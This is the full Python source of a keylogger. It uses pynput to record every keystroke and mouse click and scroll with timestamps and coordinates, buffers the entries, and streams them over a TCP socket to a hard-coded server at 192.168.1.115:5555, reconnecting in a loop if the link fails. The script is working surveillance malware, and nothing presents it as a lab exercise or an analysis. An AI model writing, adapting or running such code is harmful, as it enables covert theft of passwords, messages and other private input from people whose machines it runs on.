from pynput import keyboard, mouse
import socket, datetime, time, threading

SERVER_IP = "192.168.1.115"
SERVER_PORT = 5555
BUFFER_SIZE = 20
FLUSH_INTERVAL = 5

buffer = []
buffer_lock = threading.Lock()
sock = None

# --- Special keys ---
SPECIAL_KEYS = {
    "Key.enter": "[ENTER]",
    "Key.space": "[SPACE]",
    "Key.backspace": "[BACKSPACE]",
    "Key.tab": "[TAB]",
    "Key.caps_lock": "[CAPS]",
    "Key.shift": "[SHIFT]",
    "Key.shift_r": "[SHIFT]",
    "Key.ctrl_l": "[CTRL]",
    "Key.ctrl_r": "[CTRL]",
    "Key.alt_l": "[ALT]",
    "Key.alt_r": "[ALT]",
    "Key.delete": "[DEL]",
    "Key.esc": "[ESC]",
    "Key.up": "[↑]",
    "Key.down": "[↓]",
    "Key.left": "[←]",
    "Key.right": "[→]",
}

def connect():
    global sock
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print("[+] Ulandi")
            return
        except Exception:
            print("[-] Ulanish yo'q, 3s kutilmoqda...")
            time.sleep(3)

def send_data(data):
    global sock
    try:
        sock.send(data.encode())
    except Exception:
        print("[-] Yuborishda xato, qayta ulanish...")
        connect()

def flush_buffer():
    while True:
        time.sleep(FLUSH_INTERVAL)
        with buffer_lock:
            if not buffer:
                continue
            data = "".join(buffer)
            buffer.clear()
        send_data(data)

def log(entry):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {entry}\n"
    with buffer_lock:
        buffer.append(line)
        if len(buffer) >= BUFFER_SIZE:
            data = "".join(buffer)
            buffer.clear()
            send_data(data)

# --- Klaviatura ---
def on_key_press(key):
    try:
        # simple letters/digits
        char = key.char
        log(char)
    except AttributeError:
        # Special key
        key_str = str(key)
        label = SPECIAL_KEYS.get(key_str, f"[{key_str}]")
        log(label)

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

# --- mouse ---
def on_mouse_click(x, y, button, pressed):
    if pressed:
        btn = "LClick" if button == mouse.Button.left else \
              "RClick" if button == mouse.Button.right else "MClick"
        log(f"[{btn} ({x},{y})]")

def on_mouse_scroll(x, y, dx, dy):
    direction = "↑" if dy > 0 else "↓"
    log(f"[SCROLL{direction} ({x},{y})]")

# --- Run ---
connect()

t = threading.Thread(target=flush_buffer, daemon=True)
t.start()

# --- parallel run two listeners ---
kb_listener = keyboard.Listener(
    on_press=on_key_press,
    on_release=on_key_release
)
ms_listener = mouse.Listener(
    on_click=on_mouse_click,
    on_scroll=on_mouse_scroll
)

kb_listener.start()
ms_listener.start()

kb_listener.join()
ms_listener.join()